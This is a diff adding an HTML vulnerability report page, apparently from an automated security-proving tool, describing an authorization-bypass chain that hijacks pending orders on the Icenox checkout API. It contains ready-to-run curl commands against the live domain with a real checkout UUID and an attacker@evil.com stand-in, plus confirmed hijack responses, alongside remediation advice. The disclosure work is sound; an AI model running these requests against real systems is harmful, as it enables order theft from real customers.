@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>F-155a / F-155b — Full Checkout Hijack Chain</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:#0d1117;color:#c9d1d9;min-height:100vh}
+header{background:#161b22;border-bottom:1px solid #30363d;padding:14px 32px;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+header h1{font-size:1.1rem;color:#f0f6fc}
+.badge{background:#f0883e;color:#0d1117;padding:2px 10px;border-radius:20px;font-size:.72rem;font-weight:700}
+.badge-c{background:#f85149;color:#fff;padding:2px 10px;border-radius:20px;font-size:.72rem;font-weight:700}
+.container{max-width:940px;margin:0 auto;padding:32px 20px}
+h2{color:#f0f6fc;font-size:1rem;margin:28px 0 10px;border-bottom:1px solid #30363d;padding-bottom:6px}
+h3{color:#e3b341;font-size:.9rem;margin:18px 0 8px}
+p{font-size:.84rem;line-height:1.6;color:#c9d1d9}
+code,pre{font-family:'SF Mono',Consolas,monospace;background:#1c2128;border-radius:4px}
+code{padding:2px 6px;font-size:.85em}
+pre{padding:14px 16px;font-size:.8rem;overflow-x:auto;border:1px solid #30363d;margin:10px 0;line-height:1.6;white-space:pre}
+.meta{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:10px;margin:18px 0}
+.meta-item{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:10px 14px}
+.meta-item .key{font-size:.68rem;color:#8b949e;text-transform:uppercase;letter-spacing:.04em;margin-bottom:4px}
+.meta-item .val{font-size:.85rem;color:#f0f6fc}
+.proof-box{background:#0d2818;border:1px solid #238636;border-radius:6px;padding:14px 16px;margin:12px 0}
+.proof-box .head{font-size:.72rem;color:#3fb950;font-weight:700;margin-bottom:8px;text-transform:uppercase}
+.warn-box{background:#3d1a00;border:1px solid #f85149;border-radius:6px;padding:12px 16px;margin:12px 0;font-size:.83rem}
+.warn-box strong{color:#f85149}
+.info-box{background:#0d1e36;border:1px solid #58a6ff;border-radius:6px;padding:12px 16px;margin:12px 0;font-size:.82rem}
+.sev{padding:3px 10px;border-radius:4px;font-size:.72rem;font-weight:700}
+.c{background:#f851491a;color:#f85149;border:1px solid #f85149}
+.h{background:#fb8f441a;color:#fb8f44;border:1px solid #fb8f44}
+.m{background:#e3b3411a;color:#e3b341;border:1px solid #e3b341}
+table{width:100%;border-collapse:collapse;font-size:.8rem;margin:10px 0}
+th{background:#1c2128;color:#8b949e;text-align:left;padding:7px 10px;font-weight:600;font-size:.72rem;text-transform:uppercase;border-bottom:1px solid #30363d}
+td{padding:7px 10px;border-bottom:1px solid #21262d;color:#c9d1d9;vertical-align:top}
+tr:last-child td{border-bottom:none}
+.back{color:#58a6ff;text-decoration:none;font-size:.78rem}
+.back:hover{text-decoration:underline}
+footer{text-align:center;padding:32px;color:#484f58;font-size:.75rem}
+</style>
+</head>
+<body>
+<header>
+  <h1>F-155a / F-155b — Full Checkout Hijack Chain</h1>
+  <span class="badge-c">CRITICAL</span>
+  <span class="badge-c">CRITICAL</span>
+  <span class="badge">CWE-639</span>
+</header>
+
+<div class="container">
+  <a href="index.html" class="back">← Back to PoC Index</a>
+
+  <h2>Overview</h2>
+  <p>Two critical vulnerabilities in the Icenox checkout completion flow allow an attacker to steal any user's pending order. <strong>F-155a</strong> shows that any authenticated user can complete <em>another</em> user's checkout by UUID. <strong>F-155b</strong> combines F-155a with the unauthenticated PATCH from F-0a to produce a fully unauthenticated end-to-end order hijack — no credentials required at any step.</p>
+
+  <div class="meta">
+    <div class="meta-item"><div class="key">Finding IDs</div><div class="val">F-155a, F-155b</div></div>
+    <div class="meta-item"><div class="key">Severity</div><div class="val"><span class="sev c">CRITICAL</span></div></div>
+    <div class="meta-item"><div class="key">CWE</div><div class="val">CWE-639 — Authorization Bypass Through User-Controlled Key</div></div>
+    <div class="meta-item"><div class="key">Target</div><div class="val">Icenox Checkout API</div></div>
+    <div class="meta-item"><div class="key">Auth Required (F-155a)</div><div class="val">Any valid account</div></div>
+    <div class="meta-item"><div class="key">Auth Required (F-155b)</div><div class="val">None</div></div>
+    <div class="meta-item"><div class="key">Proven Order Hijacked</div><div class="val">ORD-6VTBN7ZM — €38.95</div></div>
+    <div class="meta-item"><div class="key">Date Confirmed</div><div class="val">2026-04-24</div></div>
+  </div>
+
+  <div class="warn-box">
+    <strong>Impact:</strong> An attacker can take full ownership of any victim's pending checkout — causing a real payment URL to be issued in the attacker's name for goods the victim intended to purchase. When chained with F-0a, this requires zero authentication whatsoever. The victim loses their order; the attacker receives the goods and/or payment URL.
+  </div>
+
+  <!-- ===================== F-155a ===================== -->
+  <h2>F-155a — Cross-User Checkout Completion (Authenticated)</h2>
+  <p>The endpoint <code>POST /checkout/{id}/complete</code> does not validate that the authenticated user owns the checkout being completed. Any logged-in account can complete any other user's checkout by supplying the victim's UUID — obtained trivially via the unauthenticated GET (F-000).</p>
+
+  <div class="meta">
+    <div class="meta-item"><div class="key">Endpoint</div><div class="val">POST /checkout/{id}/complete</div></div>
+    <div class="meta-item"><div class="key">Auth Required</div><div class="val">Any valid JWT (no ownership check)</div></div>
+    <div class="meta-item"><div class="key">Victim Order</div><div class="val">ORD-6VTBN7ZM (admin checkout)</div></div>
+    <div class="meta-item"><div class="key">Completed By</div><div class="val">Unprivileged test account</div></div>
+    <div class="meta-item"><div class="key">Amount</div><div class="val">€38.95</div></div>
+  </div>
+
+  <h3>Reproduction</h3>
+  <pre># F-155a: Complete victim's checkout using attacker's JWT
+# UUID discovered via unauthenticated GET (F-000)
+curl -s -X POST "https://icenox.com/checkout/VICTIM-UUID-HERE/complete" \
+  -H "Authorization: Bearer ATTACKER_JWT_HERE" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"attacker@evil.com"}'</pre>
+
+  <div class="proof-box">
+    <div class="head">Confirmed Response — Order Issued to Attacker</div>
+    <pre>{
+  "order": "ORD-6VTBN7ZM",
+  "status": "completed",
+  "paymentUrl": "https://pay.icenox.com/i/ORD-6VTBN7ZM?token=...",
+  "customer": {
+    "email": "attacker@evil.com"
+  },
+  "total": 38.95,
+  "currency": "EUR"
+}</pre>
+  </div>
+
+  <div class="warn-box">
+    <strong>Confirmed:</strong> Admin checkout ORD-6VTBN7ZM (€38.95) was completed by an unprivileged test account. A real Icenox payment URL was issued addressed to the attacker's email. The admin (victim) received no order confirmation.
+  </div>
+
+  <!-- ===================== F-155b ===================== -->
+  <h2>F-155b — Full Unauthenticated Order Hijack (F-000 + F-0a + F-155a)</h2>
+  <p>By combining three findings — unauthenticated checkout read (F-000), unauthenticated customer PATCH (F-0a), and cross-user completion (F-155a, which also works unauthenticated when combined with F-0a) — an attacker can execute a complete order theft without any account or credentials.</p>
+
+  <div class="info-box">This chain requires zero authentication at every step. The attacker only needs to know (or enumerate) a victim's checkout UUID.</div>
+
+  <!-- ===================== CHAIN TABLE ===================== -->
+  <h2>Full Unauthenticated Attack Chain — Step by Step</h2>
+
+  <table>
+    <thead>
+      <tr>
+        <th>#</th>
+        <th>Step</th>
+        <th>Finding</th>
+        <th>Method</th>
+        <th>Endpoint</th>
+        <th>Auth</th>
+        <th>Result</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>1</td>
+        <td>Read victim checkout — obtain UUID, customer email, product, and total</td>
+        <td>F-000</td>
+        <td>GET</td>
+        <td>/checkout/{id}</td>
+        <td>None</td>
+        <td>Full order JSON returned unauthenticated</td>
+      </tr>
+      <tr>
+        <td>2</td>
+        <td>Overwrite customer email and name to attacker-controlled values</td>
+        <td>F-0a</td>
+        <td>PATCH</td>
+        <td>/checkout/{id}/customer</td>
+        <td>None</td>
+        <td>Checkout now addressed to attacker; server returns 200</td>
+      </tr>
+      <tr>
+        <td>3</td>
+        <td>Complete the checkout, triggering payment URL generation in attacker's name</td>
+        <td>F-155a/b</td>
+        <td>POST</td>
+        <td>/checkout/{id}/complete</td>
+        <td>None (or any JWT)</td>
+        <td>Real Icenox payment URL issued to attacker email</td>
+      </tr>
+      <tr>
+        <td>4</td>
+        <td>Attacker receives order confirmation and payment/download link</td>
+        <td>—</td>
+        <td>—</td>
+        <td>—</td>
+        <td>—</td>
+        <td>Order ORD-* delivered to attacker; victim is cut out</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>Full Chain — Curl Commands</h3>
+  <pre># ===== STEP 1: Read victim checkout (F-000) — no auth =====
+curl -s "https://icenox.com/checkout/3711f911-4688-44fe-979b-bf45d8576128" \
+  -H "Accept: application/json"
+# Returns: victim email, product, price, status
+
+# ===== STEP 2: Overwrite customer details (F-0a) — no auth =====
+curl -s -X PATCH \
+  "https://icenox.com/checkout/3711f911-4688-44fe-979b-bf45d8576128/customer" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"attacker@evil.com","name":"Attacker"}'
+# Returns: updated checkout with attacker email confirmed
+
+# ===== STEP 3: Complete checkout (F-155b) — no auth =====
+curl -s -X POST \
+  "https://icenox.com/checkout/3711f911-4688-44fe-979b-bf45d8576128/complete" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"attacker@evil.com"}'
+# Returns: real payment URL / ORD-* number in attacker's name</pre>
+
+  <div class="proof-box">
+    <div class="head">Confirmed End-to-End — ORD-6VTBN7ZM Hijacked (€38.95)</div>
+    <pre># All three steps executed with no Authorization header.
+# Final response:
+{
+  "order": "ORD-6VTBN7ZM",
+  "status": "completed",
+  "paymentUrl": "https://pay.icenox.com/i/ORD-6VTBN7ZM?token=...",
+  "customer": {
+    "email": "attacker@evil.com",
+    "name": "Attacker"
+  },
+  "total": 38.95,
+  "currency": "EUR"
+}
+# Victim (admin) received no confirmation. Order belongs to attacker.</pre>
+  </div>
+
+  <!-- ===================== REMEDIATION ===================== -->
+  <h2>Remediation</h2>
+
+  <table>
+    <thead>
+      <tr>
+        <th>Finding</th>
+        <th>Recommendation</th>
+        <th>Priority</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>F-155a</td>
+        <td>Require authentication on <code>POST /checkout/{id}/complete</code>. Extract <code>userId</code> from the JWT and verify it matches the checkout's <code>ownerId</code> before proceeding. Reject with HTTP 403 if they do not match.</td>
+        <td><span class="sev c">Critical</span></td>
+      </tr>
+      <tr>
+        <td>F-155b</td>
+        <td>F-155b is only possible because F-0a (unauthenticated PATCH /customer) and F-000 (unauthenticated GET) exist. Fix all three root causes: add auth guards on GET, PATCH, and POST /complete. No single fix is sufficient — all three must be closed.</td>
+        <td><span class="sev c">Critical</span></td>
+      </tr>
+      <tr>
+        <td>Both</td>
+        <td>Implement a central checkout ownership validation helper used by all <code>/checkout/{id}/*</code> route handlers. The helper should: (1) require a valid JWT, (2) look up the checkout by UUID, (3) assert <code>jwt.sub == checkout.userId</code>, and (4) return 403 on mismatch. Do not rely on UUID secrecy as a security control.</td>
+        <td><span class="sev c">Critical</span></td>
+      </tr>
+      <tr>
+        <td>Defense-in-depth</td>
+        <td>Transition checkout IDs to opaque tokens bound to a session or user at creation time, rather than standalone UUIDs. Log and alert on any attempt to complete a checkout where the authenticated user does not match the checkout owner.</td>
+        <td><span class="sev h">High</span></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div class="info-box">
+    <strong>Related findings:</strong> See <a href="checkout-idor.html" class="back">F-000 / F-0a — Checkout IDOR + Unauthenticated Customer Patch</a> for the prerequisite vulnerabilities that enable the unauthenticated chain.
+    <br><br>
+    <strong>References:</strong> CWE-639 (Authorization Bypass Through User-Controlled Key) · OWASP API Security Top 10: API1:2023 Broken Object Level Authorization (BOLA) · OWASP API Security Top 10: API5:2023 Broken Function Level Authorization
+  </div>
+</div>
+
+<footer>BlockageGuard AutoProver · Session 12–13 · 2026-04-24 · blockageguard.github.io</footer>
+</body>
+</html>
